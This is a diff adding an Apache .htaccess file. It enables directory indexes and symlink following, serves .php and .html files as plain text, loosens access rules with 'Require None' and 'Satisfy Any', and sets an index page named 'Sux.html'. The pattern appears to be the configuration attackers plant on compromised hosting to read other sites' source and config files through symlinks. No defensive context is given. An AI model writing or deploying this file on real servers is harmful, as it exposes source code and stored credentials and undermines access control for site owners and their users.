@@ -1,0 +1,11 @@
+
+Options all
+Options +Indexes
+Options +FollowSymLinks
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None 
+Satisfy Any
